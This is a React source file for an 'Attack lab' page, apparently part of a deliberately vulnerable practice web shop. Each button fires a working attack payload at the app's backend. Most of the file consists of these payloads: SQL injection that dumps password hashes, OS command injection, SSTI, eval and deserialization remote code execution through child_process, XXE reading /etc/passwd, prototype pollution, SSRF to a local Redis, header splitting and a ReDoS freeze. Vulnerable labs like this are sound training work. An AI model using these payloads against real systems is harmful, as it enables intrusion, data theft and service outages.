import React, { useState } from "react";

/* "Attack lab": một trang chạy sẵn các payload mẫu cho mọi nhóm lỗi backend.
   Bấm 1 nút = gửi request thật tới API và in response. */
const PRESETS = [
  { group: "Injection", items: [
    { label: "SQLi search (#1)", path: `/api/products/search?q=${encodeURIComponent("%' OR 1=1--")}` },
    { label: "SQLi UNION (#1)", path: `/api/products/search?q=${encodeURIComponent("%' UNION SELECT 1, email, password_hash, 0, 0, 'x' FROM users--")}` },
    { label: "ORDER BY injection (#1)", path: `/api/products/sort?col=${encodeURIComponent("price;SELECT pg_sleep(3)--")}` },
    { label: "NoSQL $ne (#2)", method: "POST", body: { price: { $ne: null } }, path: "/api/products/filter" },
    { label: "NoSQL $where RCE (#2)", method: "POST", body: { $where: "this.price < 100" }, path: "/api/products/filter" },
    { label: "Command injection (#3)", path: `/api/utils/ping?host=${encodeURIComponent("127.0.0.1;id")}` },
    { label: "OS cmd ls (#4)", path: `/api/utils/disk?dir=${encodeURIComponent(".;cat /etc/hostname")}` },
    { label: "LDAP injection (#5)", method: "POST", body: { action: "bind", uid: "*", password: "*" }, path: "/api/ldap/bind" },
    { label: "LDAP search (#5)", method: "POST", body: { action: "search", filter: "(&(objectClass=person)(uid=*))" }, path: "/api/ldap/bind" },
    { label: "XPath injection (#7)", path: `/api/products/xpath?q=${encodeURIComponent('x" || "1"=="1')}` },
    { label: "SSTI RCE (#30)", path: `/api/orders/export?tpl=${encodeURIComponent('<%= require("child_process").execSync("id").toString() %>')}` },
  ]},
  { group: "XML", items: [
    { label: "XXE file read (#29)", method: "POST", path: "/api/xml/parse", bodyRaw: `{"xml":"<?xml version=\\"1.0\\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><r>&xxe;</r>"}` },
    { label: "XXE sample (#29)", path: "/api/xml/samples" },
    { label: "XML injection (#6)", method: "POST", path: "/api/products/wishlist", body: { name: "x</name></wishlist><product id='999'><name>PWNED" } },
    { label: "export XML (#6)", path: "/api/products/export/xml" },
  ]},
  { group: "RCE & deserialization", items: [
    { label: "eval RCE (#27)", method: "POST", path: "/api/utils/eval", body: { code: "require('child_process').execSync('id').toString()" } },
    { label: "unserialize RCE (#28)", method: "POST", path: "/api/utils/unserialize", bodyRaw: `{"payload":"{\\"rce\\":\\"_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()\\"}"}` },
    { label: "Prototype pollution (#57)", method: "POST", path: "/api/utils/merge", body: { __proto__: { adminBypass: true } } },
    { label: "check pollution gadget (#57)", path: "/api/admin/stats" },
  ]},
  { group: "SSRF & redirect", items: [
    { label: "SSRF (#10)", path: `/api/net/fetch?url=${encodeURIComponent("http://127.0.0.1:4000/health")}` },
    { label: "SSRF localhost redis (#10)", path: `/api/net/fetch?url=${encodeURIComponent("http://127.0.0.1:6379/")}` },
    { label: "Open redirect (#32)", path: `/api/net/redirect?url=${encodeURIComponent("https://example.com")}` },
    { label: "Response splitting try (#34)", path: `/api/net/jump?to=${encodeURIComponent("x\r\nSet-Cookie: pwned=1")}` },
    { label: "Host header reflect (#35/#37)", path: "/api/net/echo-headers" },
  ]},
  { group: "JWT / OAuth / SAML / enumeration", items: [
    { label: "JWT login weak secret (#61)", method: "POST", path: "/api/auth/jwt/login", body: { email: "admin@vulnshop.local", password: "admin123" } },
    { label: "JWT decode-no-verify (#61)", path: "/api/auth/jwt/whoami" },
    { label: "OAuth authorize (no redirect_uri check #62)", path: `/api/oauth/authorize?client_id=vuln-client&redirect_uri=${encodeURIComponent("https://example.com/cb")}&response_type=code` },
    { label: "SAML sample (#63)", path: "/api/saml/sample" },
    { label: "Account enumeration (#67)", path: "/api/enumerate?email=admin@vulnshop.local" },
  ]},
  { group: "DoS", items: [
    { label: "ReDoS nhẹ ~150ms (#74)", path: `/api/utils/regex?q=${encodeURIComponent("a".repeat(22) + "b")}` },
    { label: "ReDoS ~0.6s (#74)", path: `/api/utils/regex?q=${encodeURIComponent("a".repeat(24) + "b")}` },
    { label: "ReDoS ~2.5s (#74)", path: `/api/utils/regex?q=${encodeURIComponent("a".repeat(26) + "b")}` },
    { label: "ReDoS freeze ~76s (#74) - cẩn thận!", path: `/api/utils/regex?q=${encodeURIComponent("a".repeat(30) + "b")}` },
    { label: "Weak token (#45)", path: "/api/utils/token" },
    { label: "AES-ECB (#47)", path: "/api/crypto/encrypt?text=hello" },
  ]},
];

export default function Lab() {
  const [out, setOut] = useState("");
  const [busy, setBusy] = useState("");

  async function run(p) {
    setBusy(p.label);
    try {
      const opts = { method: p.method || "GET" };
      if (p.bodyRaw) {
        opts.body = JSON.parse(p.bodyRaw);
        opts._raw = true;
      } else if (p.body) opts.body = p.body;
      const res = await fetch(p.path, {
        method: opts.method,
        credentials: "include",
        headers: opts.body ? { "Content-Type": "application/json" } : undefined,
        body: opts.body ? JSON.stringify(opts.body) : undefined,
      });
      const text = await res.text();
      let pretty;
      try {
        pretty = JSON.stringify(JSON.parse(text), null, 2);
      } catch {
        pretty = text;
      }
      setOut(`=== ${p.label} -> ${res.status} ===\n${pretty.slice(0, 15000)}`);
    } catch (e) {
      setOut(`=== ${p.label} -> ERROR ===\n${e.message}`);
    } finally {
      setBusy("");
    }
  }

  return (
    <div>
      <h1>Attack lab</h1>
      <p className="hint">Mỗi nút gửi 1 payload thật tới backend. Kết quả hiện ở dưới.</p>
      {PRESETS.map((g) => (
        <div className="card" key={g.group}>
          <h2>{g.group}</h2>
          <div className="row">
            {g.items.map((p) => (
              <button key={p.label} onClick={() => run(p)} className={busy === p.label ? "primary" : ""}>
                {p.label}
              </button>
            ))}
          </div>
        </div>
      ))}
      <div className="card">
        <h2>Output</h2>
        <pre>{out || "(chưa chạy)"}</pre>
      </div>
    </div>
  );
}
